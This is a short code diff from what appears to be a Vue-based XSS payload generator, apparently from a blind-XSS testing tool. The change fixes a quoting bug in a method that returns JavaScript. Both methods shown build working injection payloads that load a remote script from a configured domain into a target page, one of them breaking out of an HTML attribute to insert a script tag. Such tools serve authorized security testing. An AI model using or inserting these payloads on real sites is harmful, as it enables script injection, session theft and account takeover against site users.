@@ -87,7 +87,7 @@ export default {
     watch: {},
     methods: {
         js_attrib: function() {
-            return 'var a=document.createElement("script");a.src="https://' + this.base_domain + '/' + this.user_note + ";document.body.appendChild(a);';
+            return 'var a=document.createElement("script");a.src="https://' + this.base_domain + '/' + this.user_note + '";document.body.appendChild(a);';
         },
         basic_script: function() {
             return "\"><script src=\"https://" + this.base_domain + '/' + this.user_note +  "\"><\/script>";
